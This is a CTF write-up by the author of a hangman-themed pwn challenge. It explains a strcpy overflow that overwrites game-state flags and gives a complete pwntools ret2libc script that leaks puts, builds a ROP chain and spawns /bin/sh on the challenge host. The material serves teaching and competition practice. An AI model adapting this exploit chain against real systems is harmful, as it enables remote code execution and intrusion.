# HANGPWN

## Writeup
Hey 0xk7 here. This is my first ever pwn challenge that I made.
I took a lot of inspiration from other pwn challenges and help from my collegues here at RIT.

So the thought behind this challenge was to make the input be very small and the perfect game to do that was hangman.
You would guess a letter and after that you would be able to guess the word. 

Lets take a look at the main structure. 

The program allows for 1 letter input and the word to guess as separate buffers. So we can't do much there.

In the main function there are also some string length checks and new line removal.
```c
        buffer[strcspn(buffer, "\n")] = 0;
```
The exploit is in the strcpy of the buffer here
```c
        strcpy(words[], buffer);
```
This is vulnerable as for every attempt strcpy gets called and copies all the way until a newline is found. So everytime we guess a letter a buffer overflow is occuring.

So at the final guess we have the ability to overwrite the stack. Here we have to be careful as we want to keep overwriting the stack by staying in the game state.

In order to do that we have to overwrite the two variables that control the game state. Game over and the solved variable shown below
```c
typedef struct game {
    short attempts;
    char words[];
    char game_over;
    char solved;
} game;
```
control over atttemps
```c
if (attempts + 1 == ATTEMPTS) {
            game_over = 1;
        }
```
control over correct answer
```c
if (compare(guess_buffer, answer, ATTEMPTS)){
            solved = 1;
        }
```
Since the stack grows top down we can overflow our input to overwrite both game over and solved to stay in the game state.
We also have to encode our input by the encoding used in the function which is the input xored by 0x34.

Now that we found the exploit we can use pwntools to get ret2libc.

### Solution

```py
from pwn import *

# pe = process('jail/bin/hangpwn')
pe = remote("ctf.ritsec.club", 9003)
# pe = process('hangpwn')
elf = ELF('hangpwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

print(dir(elf))

# PUTS_PLT = elf.plt['printf']
PUTS_PLT = 0x4010b0
POP_RDI = 0x00000000004016e3
RET_ADDR = 0x000000000040101a

PUTS_GOT = elf.got['puts']
MAIN_ADDR = elf.symbols['main']
# pe.s
context.log_level='debug'

def ready_overflow(pe):
    pe.send("4\n"*18*2)

ready_overflow(pe)
pe.clean()

def send_addr(addr):
    pe.sendline(chr((addr & 0xff) ^ 0x34))
    print(str((addr & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>8) & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>16) & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>24)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>32)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>40)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>48)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>54)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.clean()
    
send_addr(POP_RDI)
send_addr(PUTS_GOT)
send_addr(PUTS_PLT)
send_addr(MAIN_ADDR)

pe.sendline("1")
import time
time.sleep(1)
pe.clean()
pe.sendline("BINGAUS")
# pe.readuntil("Enter word: ")
print("A")
leak=u64((pe.readline())[:-1].ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']
ready_overflow(pe)
# pe.sendline(POP_RDI)
send_addr(POP_RDI)
BINSH = next(libc.search(b"/bin/sh"))
send_addr(BINSH)
send_addr(RET_ADDR)
send_addr(libc.symbols['system'])
pe.sendline("1")
import time
time.sleep(1)
pe.clean()
pe.sendline("BINGAUS")

pe.interactive()
```

### Flag
Flag: RS{HUNG_UP_0N_0FF_BY_0N3}